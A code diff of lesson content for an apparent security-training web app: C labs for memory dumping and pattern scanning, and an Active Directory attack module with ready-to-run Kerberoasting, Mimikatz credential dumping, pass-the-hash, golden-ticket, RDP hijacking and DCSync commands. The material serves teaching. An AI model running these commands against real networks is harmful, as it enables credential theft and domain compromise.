+      description: "Build real security tools with step-by-step guidance",
+      sections: [
+        {
+          type: "intro",
+          content: `These hands-on labs guide you through building actual security tools. Each lab includes complete, working code that you can compile and experiment with. These projects reinforce the concepts from earlier modules and give you practical experience.`
+        },
+        {
+          title: "Lab 1: Process Memory Dumper",
+          content: `Build a tool that dumps memory regions from a running process - useful for malware analysis and memory forensics.
+
+**What You'll Build:**
+• Open a process by PID
+• Enumerate all memory regions
+• Read and dump committed memory
+• Save to file with region metadata
+
+**Key APIs:**
+• OpenProcess
+• VirtualQueryEx
+• ReadProcessMemory
+• CreateFile / WriteFile`,
+          example: {
+            title: "Memory Dumper Implementation",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+BOOL DumpProcessMemory(DWORD pid, LPCWSTR outputPath) {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+        FALSE, pid
     );
     
-    if (!hHook) {
-        printf("Hook failed: %lu\\n", GetLastError());
+    if (!hProcess) {
+        printf("[-] OpenProcess failed: %lu\\n", GetLastError());
+        return FALSE;
+    }
+    
+    HANDLE hFile = CreateFileW(
+        outputPath, GENERIC_WRITE, 0, NULL,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
+    );
+    
+    if (hFile == INVALID_HANDLE_VALUE) {
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    MEMORY_BASIC_INFORMATION mbi;
+    LPVOID address = NULL;
+    DWORD totalDumped = 0;
+    
+    printf("[*] Dumping process %lu...\\n\\n", pid);
+    
+    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
+        // Only dump committed, readable memory
+        if (mbi.State == MEM_COMMIT && 
+            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | 
+                           PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
+            
+            PBYTE buffer = (PBYTE)malloc(mbi.RegionSize);
+            SIZE_T bytesRead;
+            
+            if (ReadProcessMemory(hProcess, mbi.BaseAddress, 
+                                  buffer, mbi.RegionSize, &bytesRead)) {
+                
+                // Write region header
+                DWORD written;
+                WriteFile(hFile, &mbi.BaseAddress, sizeof(PVOID), &written, NULL);
+                WriteFile(hFile, &bytesRead, sizeof(SIZE_T), &written, NULL);
+                WriteFile(hFile, buffer, (DWORD)bytesRead, &written, NULL);
+                
+                printf("[+] Dumped 0x%p - 0x%p (%llu KB)\\n",
+                    mbi.BaseAddress,
+                    (PBYTE)mbi.BaseAddress + bytesRead,
+                    bytesRead / 1024);
+                
+                totalDumped += (DWORD)bytesRead;
+            }
+            free(buffer);
+        }
+        
+        address = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
+    }
+    
+    printf("\\n[+] Total dumped: %lu bytes\\n", totalDumped);
+    
+    CloseHandle(hFile);
+    CloseHandle(hProcess);
+    return TRUE;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc != 3) {
+        printf("Usage: %s <PID> <output.dmp>\\n", argv[0]);
         return 1;
     }
     
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+    DWORD pid = atoi(argv[1]);
+    WCHAR output[MAX_PATH];
+    MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, output, MAX_PATH);
+    
+    DumpProcessMemory(pid, output);
+    return 0;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "Lab 2: Pattern Scanner",
+          content: `Create a memory pattern scanner - essential for finding code caves, signatures, or specific data structures in process memory.
+
+**Features:**
+• Scan memory for byte patterns
+• Support for wildcards (masked search)
+• Report all matches with addresses
+• Optionally patch matched locations`,
+          example: {
+            title: "Pattern Scanner Implementation",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+typedef struct {
+    PVOID address;
+    SIZE_T size;
+} SCAN_RESULT;
+
+BOOL PatternMatch(PBYTE data, PBYTE pattern, PBYTE mask, SIZE_T patternSize) {
+    for (SIZE_T i = 0; i < patternSize; i++) {
+        if (mask[i] == 'x' && data[i] != pattern[i]) {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+DWORD ScanPattern(
+    HANDLE hProcess,
+    PBYTE pattern,
+    PBYTE mask,
+    SIZE_T patternSize,
+    SCAN_RESULT* results,
+    DWORD maxResults
+) {
+    DWORD found = 0;
+    MEMORY_BASIC_INFORMATION mbi;
+    LPVOID address = NULL;
+    
+    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) && 
+           found < maxResults) {
+        
+        if (mbi.State == MEM_COMMIT &&
+            !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS))) {
+            
+            PBYTE buffer = (PBYTE)malloc(mbi.RegionSize);
+            SIZE_T bytesRead;
+            
+            if (ReadProcessMemory(hProcess, mbi.BaseAddress,
+                                  buffer, mbi.RegionSize, &bytesRead)) {
+                
+                // Scan buffer for pattern
+                for (SIZE_T i = 0; i <= bytesRead - patternSize; i++) {
+                    if (PatternMatch(buffer + i, pattern, mask, patternSize)) {
+                        results[found].address = (PBYTE)mbi.BaseAddress + i;
+                        results[found].size = patternSize;
+                        found++;
+                        
+                        printf("[+] Found at 0x%p\\n", results[found-1].address);
+                        
+                        if (found >= maxResults) break;
+                    }
+                }
+            }
+            free(buffer);
+        }
+        
+        address = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
     }
     
-    UnhookWindowsHookEx(hHook);
-    if (logFile) fclose(logFile);
+    return found;
+}
+
+int main() {
+    // Example: Find all instances of "MZ" (DOS header magic)
+    BYTE pattern[] = { 0x4D, 0x5A };  // "MZ"
+    BYTE mask[] = { 'x', 'x' };       // Match both bytes exactly
     
+    HANDLE hProcess = GetCurrentProcess();
+    SCAN_RESULT results[100];
+    
+    printf("[*] Scanning for MZ headers...\\n");
+    DWORD count = ScanPattern(
+        hProcess, pattern, mask, sizeof(pattern),
+        results, 100
+    );
+    
+    printf("\\n[+] Found %lu matches\\n", count);
     return 0;
 }`,
             language: "c"
@@ -1255,236 +2019,320 @@ int main() {
       ]
     },
     "active-directory": {
-      title: "Active Directory Attacks",
-      description: "Master AD enumeration, lateral movement, and domain dominance",
+      title: "Active Directory Security",
+      description: "Understanding and exploiting Active Directory environments",
       sections: [
         {
           type: "intro",
-          content: `Active Directory (AD) is the backbone of most enterprise networks. Understanding how to enumerate, attack, and pivot through AD environments is essential for red team operations. This module covers everything from initial reconnaissance to complete domain compromise.`
+          content: `Active Directory (AD) is the backbone of enterprise Windows networks, managing authentication, authorization, and resources across the domain. Understanding AD security is essential for penetration testers, red teamers, and defenders alike. This module covers AD fundamentals, enumeration, and attack techniques.`
         },
         {
-          title: "Understanding Active Directory",
-          content: `Active Directory is Microsoft's directory service for Windows domain networks. It stores information about network resources and makes them accessible to users and applications.
+          title: "Active Directory Fundamentals",
+          content: `Active Directory is a hierarchical directory service that stores information about network objects and makes this information available to users and administrators.
 
-**Key Components:**
-• **Domain Controller (DC)**: Server that handles authentication and authorization
-• **Domain**: A logical group of network objects (users, computers, groups)
-• **Forest**: Collection of one or more domains that share a common schema
-• **Organizational Unit (OU)**: Container for organizing objects within a domain`,
+**Core Components:**
+• **Domain Controller (DC)** - Server running AD DS, handles authentication
+• **Domain** - Logical grouping of objects (users, computers, groups)
+• **Forest** - Collection of domains sharing a common schema
+• **Organizational Unit (OU)** - Container for organizing objects
+• **Group Policy (GPO)** - Centralized configuration management
+
+**Key Protocols:**
+• **LDAP** - Lightweight Directory Access Protocol (389/636)
+• **Kerberos** - Primary authentication protocol (88)
+• **NTLM** - Legacy authentication, still widely used
+• **DNS** - Domain Name System (integrated with AD)
+• **SMB** - Server Message Block for file shares (445)
+
+**Authentication Flow (Kerberos):**
+1. User requests TGT from KDC (AS-REQ)
+2. KDC validates password, issues TGT (AS-REP)
+3. User presents TGT, requests service ticket (TGS-REQ)
+4. KDC issues service ticket (TGS-REP)
+5. User authenticates to service with ticket`,
           concepts: [
-            { label: "LDAP", explanation: "Lightweight Directory Access Protocol - used to query AD" },
-            { label: "Kerberos", explanation: "Authentication protocol used by AD" },
-            { label: "NTLM", explanation: "Legacy authentication protocol, still widely used" },
-            { label: "SPN", explanation: "Service Principal Name - identifies service accounts" }
-          ],
-          tip: `Always start with enumeration! Understanding the AD structure before attacking gives you a roadmap for compromise.`
+            { label: "TGT", explanation: "Ticket Granting Ticket - Obtained from KDC, used to request service tickets. Valid for 10 hours by default." },
+            { label: "TGS", explanation: "Ticket Granting Service - Issues service tickets when presented with valid TGT." },
+            { label: "SPN", explanation: "Service Principal Name - Unique identifier for a service instance (HTTP/web.corp.local)." },
+            { label: "KRBTGT", explanation: "Service account for KDC. Its hash encrypts all TGTs - compromise = Golden Ticket." }
+          ]
         },
         {
-          title: "Domain Enumeration",
-          content: `Before attacking, you need to understand the target environment. Enumeration reveals users, groups, computers, and trust relationships.
+          title: "AD Enumeration Techniques",
+          content: `Enumeration is the first step in attacking AD. The goal is to understand the environment, identify targets, and find attack paths.
 
-**Key enumeration targets:**
-• Domain Admins and Enterprise Admins groups
-• Service accounts (often have weak passwords)
-• Computers with unconstrained delegation
-• Group Policy Objects (GPOs)
-• Trust relationships between domains`,
+**Enumeration Targets:**
+• Domain information (functional level, trusts)
+• Users (privileged accounts, service accounts)
+• Groups (Domain Admins, Enterprise Admins)
+• Computers (DCs, servers, workstations)
+• Group Policy Objects (password policies, scripts)
+• Access Control Lists (delegation, permissions)
+
+**Tools for Enumeration:**
+• **PowerView** - PowerShell AD enumeration
+• **BloodHound** - Graph-based attack path analysis
+• **ADExplorer** - GUI LDAP browser
+• **ldapsearch** - Command-line LDAP queries
+
+**Key LDAP Queries:**
+• All users: (objectClass=user)
+• Domain Admins: (memberOf=CN=Domain Admins,...)
+• Computers: (objectClass=computer)
+• SPNs: (servicePrincipalName=*)`,
           example: {
-            title: "PowerView Enumeration",
-            description: "Common PowerView commands for AD enumeration:",
-            code: `# Import PowerView
-Import-Module .\\PowerView.ps1
+            title: "PowerShell AD Enumeration",
+            code: `# Import Active Directory module
+Import-Module ActiveDirectory
 
-# Get current domain info
-Get-Domain
+# Get domain information
+$domain = Get-ADDomain
+Write-Host "[*] Domain: $($domain.DNSRoot)"
+Write-Host "[*] Domain SID: $($domain.DomainSID)"
+Write-Host "[*] Forest: $($domain.Forest)"
+Write-Host "[*] Domain Controllers:"
+Get-ADDomainController -Filter * | ForEach-Object {
+    Write-Host "    - $($_.Name) ($($_.IPv4Address))"
+}
 
-# Get all domain controllers
-Get-DomainController
+# Enumerate privileged groups
+Write-Host "`n[*] Domain Admins:"
+Get-ADGroupMember "Domain Admins" -Recursive | ForEach-Object {
+    Write-Host "    - $($_.SamAccountName)"
+}
 
-# Get all domain users
-Get-DomainUser | Select-Object samaccountname,description
+Write-Host "`n[*] Enterprise Admins:"
+Get-ADGroupMember "Enterprise Admins" -Recursive | ForEach-Object {
+    Write-Host "    - $($_.SamAccountName)"
+}
 
-# Find Domain Admins
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+# Find service accounts (users with SPNs)
+Write-Host "`n[*] Kerberoastable Accounts:"
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
+    ForEach-Object {
+        Write-Host "    - $($_.SamAccountName): $($_.ServicePrincipalName[0])"
+    }
+
+# Find accounts with no pre-auth (ASREPRoastable)
+Write-Host "`n[*] ASREPRoastable Accounts:"
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | ForEach-Object {
+    Write-Host "    - $($_.SamAccountName)"
+}
 
 # Find computers with unconstrained delegation
-Get-DomainComputer -Unconstrained
-
-# Find users with SPNs (Kerberoastable)
-Get-DomainUser -SPN
-
-# Find all Group Policy Objects
-Get-DomainGPO | Select-Object displayname,gpcfilesyspath
-
-# Find shares
-Find-DomainShare -CheckShareAccess`,
+Write-Host "`n[*] Unconstrained Delegation:"
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} | ForEach-Object {
+    Write-Host "    - $($_.Name)"
+}`,
             language: "powershell"
           }
         },
         {
           title: "Kerberos Attacks",
-          content: `Kerberos is AD's primary authentication protocol. Understanding its weaknesses is crucial for privilege escalation.
-
-**AS-REP Roasting:**
-Target accounts without Kerberos pre-authentication. You can request their AS-REP and crack it offline.
+          content: `Kerberos, while more secure than NTLM, has several well-known attack vectors due to design decisions and common misconfigurations.
 
 **Kerberoasting:**
-Request TGS tickets for service accounts and crack them offline. Service account passwords are often weak.`,
-          warning: `These attacks generate network traffic that can be detected. Use them sparingly and at appropriate times.`,
+Service tickets are encrypted with the service account's password hash. Any domain user can request tickets for any SPN and attempt offline cracking.
+• Request TGS for accounts with SPNs
+• Extract encrypted ticket
+• Crack offline with hashcat/john
+
+**ASREPRoasting:**
+Accounts with "Do not require Kerberos pre-authentication" can have their AS-REP cracked offline.
+• No credentials needed to request AS-REP
+• Hash in response can be cracked
+• Often found on legacy service accounts
+
+**Golden Ticket:**
+With the KRBTGT hash, forge TGTs for any user.
+• Requires domain compromise first (to get KRBTGT hash)
+• Tickets valid for 10 years by default
+• Survives password changes (until KRBTGT rotated twice)
+
+**Silver Ticket:**
+Forge TGS for a specific service using its password hash.
+• Only works against that specific service
+• Doesn't touch DC, harder to detect
+• Useful for persistence on specific servers`,
+          warning: `Kerberoasting is often the fastest path to domain admin. Service accounts frequently have weak passwords and domain admin privileges.`,
           example: {
-            title: "Kerberos Attack Commands",
-            code: `# ASREPRoasting with Rubeus
-.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+            title: "Kerberoasting with PowerShell",
+            code: `# Method 1: Using Rubeus
+.\\Rubeus.exe kerberoast /outfile:hashes.txt
 
-# With Impacket
-GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
+# Method 2: Pure PowerShell
+Add-Type -AssemblyName System.IdentityModel
 
-# Kerberoasting with Rubeus  
-.\\Rubeus.exe kerberoast /outfile:tgs.txt
+# Get all SPNs
+$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$search.Filter = "(servicePrincipalName=*)"
+$results = $search.FindAll()
 
-# With Impacket
-GetUserSPNs.py -request -dc-ip 10.10.10.1 domain.local/user:password
+foreach ($result in $results) {
+    $userEntry = $result.GetDirectoryEntry()
+    
+    foreach ($spn in $userEntry.servicePrincipalName) {
+        Write-Host "[*] Requesting ticket for: $spn"
+        
+        try {
+            # Request the ticket
+            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+            
+            # Extract the hash (simplified - real extraction is more complex)
+            $ticketBytes = $ticket.GetRequest()
+            $hexHash = [BitConverter]::ToString($ticketBytes) -replace '-'
+            
+            Write-Host "[+] Got ticket for $spn"
+            # In practice, extract and format for hashcat/john
+        }
+        catch {
+            Write-Host "[-] Failed: $spn"
+        }
+    }
+}
 
-# Crack with hashcat
-hashcat -m 18200 asrep.txt wordlist.txt  # AS-REP
-hashcat -m 13100 tgs.txt wordlist.txt    # TGS`,
+# Crack with hashcat:
+# hashcat -m 13100 hashes.txt wordlist.txt`,
             language: "powershell"
           }
         },
         {
           title: "Lateral Movement",
-          content: `Once you have credentials, you need to move through the network to reach high-value targets.
+          content: `Once credentials are obtained, lateral movement allows spreading across the network to reach high-value targets.
 
 **Pass-the-Hash (PtH):**
-Use NTLM hash to authenticate without knowing the password.
+Use NTLM hash directly without knowing the password.
+• Works with NTLM authentication (not Kerberos)
+• Common with psexec, wmiexec, smbexec
+• Detected by modern EDRs
 
 **Pass-the-Ticket (PtT):**
-Use stolen Kerberos tickets for authentication.
+Use stolen Kerberos tickets.
+• Extract tickets from memory with Mimikatz
+• Import on different machine
+• Impersonate the ticket owner
 
 **Overpass-the-Hash:**
-Convert NTLM hash to Kerberos ticket (best of both worlds).`,
-          concepts: [
-            { label: "NTLM Hash", explanation: "MD4 hash of user's password, sufficient for authentication" },
-            { label: "TGT", explanation: "Ticket Granting Ticket - proves identity to KDC" },
-            { label: "TGS", explanation: "Ticket Granting Service - grants access to specific services" },
-            { label: "Rubeus", explanation: "C# toolset for Kerberos interaction" }
-          ],
-          example: {
-            title: "Lateral Movement Commands",
-            code: `# Pass-the-Hash with mimikatz
-sekurlsa::pth /user:admin /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee
+Use NTLM hash to request Kerberos tickets.
+• Combines PtH with Kerberos
+• More stealthy than pure NTLM
+• Appears as normal Kerberos authentication
 
-# Pass-the-Hash with Impacket
-psexec.py -hashes :aad3b435b51404ee corp.local/admin@10.10.10.5
+**RDP Hijacking:**
+Take over disconnected RDP sessions.
+• tscon command to switch sessions
+• Requires SYSTEM privileges
+• No password needed for disconnected sessions`,
+          example: {
+            title: "Lateral Movement Examples",
+            code: `# =========== Mimikatz Commands ===========
+
+# Dump credentials from LSASS
+mimikatz # sekurlsa::logonpasswords
+
+# Pass-the-Hash
+mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:abc123... /run:cmd
+
+# Extract Kerberos tickets
+mimikatz # sekurlsa::tickets /export
 
 # Pass-the-Ticket
-.\\Rubeus.exe ptt /ticket:base64_ticket
+mimikatz # kerberos::ptt ticket.kirbi
 
-# Overpass-the-Hash
-.\\Rubeus.exe asktgt /user:admin /rc4:ntlm_hash /ptt
+# Golden Ticket (requires KRBTGT hash)
+mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:abc123... /ptt
 
-# Remote execution with WMI
-wmiexec.py -hashes :ntlm_hash domain/user@target
+# =========== Impacket Examples ===========
 
-# PowerShell Remoting
-Enter-PSSession -ComputerName DC01 -Credential $cred`,
+# PsExec with hash
+impacket-psexec corp.local/admin@target -hashes :abc123...
+
+# WMI Exec
+impacket-wmiexec corp.local/admin@target -hashes :abc123...
+
+# SMB Exec (more stealthy)
+impacket-smbexec corp.local/admin@target -hashes :abc123...
+
+# =========== RDP Hijacking ===========
+
+# List sessions
+query user
+
+# Hijack session (requires SYSTEM)
+# Creates service to run tscon
+sc create hijack binpath= "cmd.exe /k tscon 2 /dest:console"
+net start hijack`,
             language: "powershell"
-          }
-        },
-        {
-          title: "Privilege Escalation via ACLs",
-          content: `Active Directory Access Control Lists (ACLs) define permissions on AD objects. Misconfigurations can be exploited for privilege escalation.
-
-**Dangerous Permissions:**
-• **GenericAll**: Full control - can reset passwords, add to groups
-• **GenericWrite**: Modify attributes - can set SPN for Kerberoasting
-• **WriteDACL**: Modify permissions - grant yourself more access
-• **WriteOwner**: Take ownership - then modify permissions`,
-          tip: `BloodHound is essential for visualizing attack paths through ACL abuse. Always run it first!`,
-          example: {
-            title: "ACL Abuse Examples",
-            code: `# Find users with GenericAll on Domain Admins
-Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
-    ? {$_.ActiveDirectoryRights -match "GenericAll"} |
-    Select-Object SecurityIdentifier
-
-# If you have GenericAll - reset password
-Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
-
-# If you have GenericAll - add to group
-Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"
-
-# If you have GenericWrite - set SPN for Kerberoasting
-Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
-
-# Then Kerberoast the account
-.\\Rubeus.exe kerberoast /user:targetuser`,
-            language: "powershell"
-          }
+          },
+          tip: `Always check for cached credentials on compromised systems. Users who have logged in leave hashes in LSASS memory.`
         },
         {
           title: "Domain Dominance",
-          content: `Once you have Domain Admin, these techniques provide persistent access and allow extracting all credentials.
+          content: `The ultimate goal is often complete domain control. These techniques establish persistent, privileged access.
 
 **DCSync:**
-Replicate domain controller data to extract all password hashes.
+Replicate domain credentials using Directory Replication privileges.
+• Mimics domain controller behavior
+• Extracts any account's hash
+• Requires Replicating Directory Changes rights
+• Often available to Domain Admins
 
-**Golden Ticket:**
-Forge TGT with KRBTGT hash - unlimited access for 10 years.
+**DCShadow:**
+Register a rogue Domain Controller.
+• Push malicious changes to AD
+• Can modify any object
+• Extremely stealthy - uses legitimate replication
+• Requires elevated privileges
 
-**Silver Ticket:**
-Forge TGS for specific services - more stealthy than Golden Ticket.`,
-          warning: `These techniques leave artifacts. DCSync generates replication traffic. Golden Tickets require the KRBTGT hash which means you've already compromised a DC.`,
+**AdminSDHolder & SDProp:**
+Abuse the AdminSDHolder protection mechanism.
+• Modify AdminSDHolder ACL
+• SDProp (runs every 60 min) propagates to protected groups
+• Grants persistent access to Domain Admins
+• Survives password changes
+
+**ADCS Attacks (AD Certificate Services):**
+Abuse certificate templates and CA permissions.
+• ESC1-ESC8 attack classes
+• Request certificates as other users
+• Persist across password changes`,
           example: {
-            title: "Domain Dominance Attacks",
-            code: `# DCSync - extract all hashes
-mimikatz # lsadump::dcsync /domain:corp.local /all
+            title: "DCSync Attack",
+            code: `# DCSync with Mimikatz
+# Extracts password hashes by simulating DC replication
 
-# DCSync - extract specific user (like krbtgt)
+# Get specific user's hash (e.g., krbtgt for Golden Ticket)
 mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
 
-# With Impacket
-secretsdump.py -just-dc corp.local/admin:password@DC01
+# Get all domain hashes
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv
 
-# Golden Ticket
-mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt
+# DCSync with Impacket (from Linux)
+impacket-secretsdump corp.local/admin:'Password123'@DC01.corp.local
 
-# With Rubeus
-.\\Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /rc4:krbtgt_hash /ptt
+# With hashes
+impacket-secretsdump corp.local/admin@DC01.corp.local -hashes :abc123...
 
-# Silver Ticket (for CIFS/file shares)
-mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:machine_hash /ptt`,
+# =========== Required Privileges ===========
+# These rights enable DCSync:
+# - Replicating Directory Changes
+# - Replicating Directory Changes All
+# - Replicating Directory Changes in Filtered Set
+
+# Check current user's rights
+# PowerShell:
+Get-ADUser -Identity (whoami).Split('\\')[1] -Properties * | 
+    Select-Object -ExpandProperty MemberOf
+
+# Check if user has DCSync rights
+$acl = Get-Acl "AD:\\DC=corp,DC=local"
+$acl.Access | Where-Object {
+    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or  # DS-Replication-Get-Changes
+    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"      # DS-Replication-Get-Changes-All
+}`,
             language: "powershell"
-          }
-        },
-        {
-          title: "AD Certificate Services (ADCS) Attacks",
-          content: `ADCS is frequently misconfigured, providing paths to domain compromise.
-
-**ESC1**: Certificate templates allowing requesters to specify SAN
-**ESC2**: Templates with Any Purpose EKU
-**ESC3**: Certificate Request Agent templates
-**ESC4**: Vulnerable certificate template ACLs
-**ESC8**: Web enrollment NTLM relay`,
-          example: {
-            title: "ADCS Enumeration and Exploitation",
-            code: `# Enumerate vulnerable templates with Certify
-.\\Certify.exe find /vulnerable
-
-# ESC1 - Request cert with admin SAN
-.\\Certify.exe request /ca:CA01.corp.local\\corp-CA /template:VulnTemplate /altname:administrator
-
-# Convert to PFX
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
-
-# Use cert for authentication
-.\\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:password /ptt
-
-# With Certipy (Python)
-certipy find -u user@corp.local -p password -dc-ip 10.10.10.1
-certipy req -u user@corp.local -p password -ca corp-CA -target CA01 -template VulnTemplate -upn administrator@corp.local`,
-            language: "powershell"
-          }
+          },
+          warning: `DCSync is a high-impact attack that often triggers alerts. Modern SIEMs and EDRs monitor for replication from non-DC sources.`
         }
       ]
     }
@@ -1494,36 +2342,35 @@ certipy req -u user@corp.local -p password -ca corp-CA -target CA01 -template Vu
 
   if (!currentLesson) {
     return (
-      <Card className="p-8 bg-card border-border/50 backdrop-blur">
-        <div className="text-center space-y-4">
-          <BookOpen className="h-16 w-16 text-muted-foreground/50 mx-auto" />
-          <p className="text-lg text-muted-foreground">Select a module to start learning</p>
-          <p className="text-sm text-muted-foreground/70">Each module has clear explanations, examples, and practice code</p>
+      <Card className="flex flex-col glass h-full min-h-[500px]">
+        <div className="flex-1 flex items-center justify-center p-8">
+          <div className="text-center space-y-4">
+            <BookOpen className="h-16 w-16 text-muted-foreground mx-auto opacity-50" />
+            <p className="text-lg text-muted-foreground">Select a module to start learning</p>
+          </div>
         </div>
       </Card>
     );
   }
 
   return (
-    <Card className="h-[600px] flex flex-col bg-card border-border shadow-lg">
+    <Card className="flex flex-col glass overflow-hidden h-full min-h-[500px]">
       {/* Header */}
-      <div className="p-4 border-b border-border/50 bg-gradient-to-r from-primary/10 to-transparent">
+      <div className="p-4 border-b border-border/50 bg-gradient-to-r from-primary/10 via-primary/5 to-transparent shrink-0">
         <div className="flex items-center gap-3">
-          <div className="p-2 rounded-lg bg-primary/20">
+          <div className="p-2 rounded-lg bg-primary/20 border border-primary/30">
             <BookOpen className="h-5 w-5 text-primary" />
           </div>
-          <div className="flex-1">
-            <h3 className="font-semibold text-foreground">{currentLesson.title}</h3>
-            {currentLesson.description && (
-              <p className="text-xs text-muted-foreground mt-1">{currentLesson.description}</p>
-            )}
+          <div className="min-w-0 flex-1">
+            <h3 className="font-semibold text-foreground truncate">{currentLesson.title}</h3>
+            <p className="text-xs text-muted-foreground truncate">{currentLesson.description}</p>
           </div>
         </div>
       </div>
       
       {/* Content */}
-      <ScrollArea className="flex-1 p-6">
-        <div className="space-y-8 max-w-4xl">
+      <ScrollArea className="flex-1">
+        <div className="p-4 md:p-6 space-y-6">
           {currentLesson.sections.map((section: any, idx: number) => (
             <div key={idx} className="space-y-4">
               {/* Intro Section */}
@@ -1538,17 +2385,17 @@ certipy req -u user@corp.local -p password -ca corp-CA -target CA01 -template Vu
                 <>
                   {/* Section Title */}
                   {section.title && (
-                    <div className="flex items-start gap-3">
-                      <div className="mt-1 w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center text-sm font-bold text-primary shrink-0">
+                    <div className="flex items-start gap-3 pt-2">
+                      <div className="mt-0.5 w-7 h-7 rounded-full bg-primary/20 flex items-center justify-center text-xs font-bold text-primary shrink-0">
                         {idx}
                       </div>
-                      <h4 className="text-xl font-bold text-foreground">{section.title}</h4>
+                      <h4 className="text-lg font-bold text-foreground">{section.title}</h4>
                     </div>
                   )}
 
                   {/* Main Content */}
                   {section.content && (
-                    <div className="ml-11 space-y-3">
+                    <div className="ml-10 space-y-3">
                       <div className="prose prose-sm max-w-none">
                         <p className="text-sm text-foreground/90 leading-relaxed whitespace-pre-line">
                           {section.content}
@@ -1559,15 +2406,15 @@ certipy req -u user@corp.local -p password -ca corp-CA -target CA01 -template Vu
 
                   {/* Key Concepts Box */}
                   {section.concepts && section.concepts.length > 0 && (
-                    <div className="ml-11 p-4 rounded-lg bg-concept-bg border border-concept-border">
+                    <div className="ml-10 p-4 rounded-lg bg-concept-bg/50 border border-concept-border/50">
                       <div className="flex items-center gap-2 mb-3">
-                        <Sparkles className="h-4 w-4 text-concept-border" />
-                        <h5 className="font-semibold text-concept-text text-sm">KEY CONCEPTS</h5>
+                        <Brain className="h-4 w-4 text-concept-border" />
+                        <h5 className="font-semibold text-concept-text text-xs uppercase tracking-wider">Key Concepts</h5>
                       </div>
                       <div className="space-y-2">
                         {section.concepts.map((concept: any, i: number) => (
-                          <div key={i} className="flex gap-3">
-                            <code className="text-xs font-mono text-concept-border bg-concept-bg/50 px-2 py-1 rounded shrink-0">
+                          <div key={i} className="flex gap-3 items-start">
+                            <code className="text-xs font-mono text-concept-border bg-concept-bg px-2 py-0.5 rounded shrink-0">
                               {concept.label}
                             </code>
                             <p className="text-xs text-concept-text/90 leading-relaxed">
@@ -1581,72 +2428,50 @@ certipy req -u user@corp.local -p password -ca corp-CA -target CA01 -template Vu
 
                   {/* Tip Box */}
                   {section.tip && (
-                    <div className="ml-11 p-4 rounded-lg bg-tip-bg border border-tip-border">
+                    <div className="ml-10 p-3 rounded-lg bg-tip-bg/50 border border-tip-border/50">
                       <div className="flex items-start gap-2">
                         <Lightbulb className="h-4 w-4 text-tip-border shrink-0 mt-0.5" />
-                        <div>
-                          <h5 className="font-semibold text-tip-text text-sm mb-1">💡 PRO TIP</h5>
-                          <p className="text-xs text-tip-text/90 leading-relaxed">{section.tip}</p>
-                        </div>
+                        <p className="text-xs text-tip-text leading-relaxed">{section.tip}</p>
                       </div>
                     </div>
                   )}
 
                   {/* Warning Box */}
                   {section.warning && (
-                    <div className="ml-11 p-4 rounded-lg bg-warning-bg border border-warning-border">
+                    <div className="ml-10 p-3 rounded-lg bg-warning/10 border border-warning/30">
                       <div className="flex items-start gap-2">
-                        <AlertTriangle className="h-4 w-4 text-warning-border shrink-0 mt-0.5" />
-                        <div>
-                          <h5 className="font-semibold text-warning-text text-sm mb-1">⚠️ IMPORTANT</h5>
-                          <p className="text-xs text-warning-text/90 leading-relaxed">{section.warning}</p>
-                        </div>
+                        <AlertTriangle className="h-4 w-4 text-warning shrink-0 mt-0.5" />
+                        <p className="text-xs text-warning leading-relaxed">{section.warning}</p>
                       </div>
                     </div>
                   )}
 
                   {/* Example Box */}
                   {section.example && (
-                    <div className="ml-11 space-y-3">
-                      <div className="p-4 rounded-t-lg bg-example-bg border border-example-border border-b-0">
-                        <div className="flex items-center gap-2 mb-2">
+                    <div className="ml-10 space-y-0">
+                      <div className="p-3 rounded-t-lg bg-example-bg/50 border border-example-border/50 border-b-0">
+                        <div className="flex items-center gap-2">
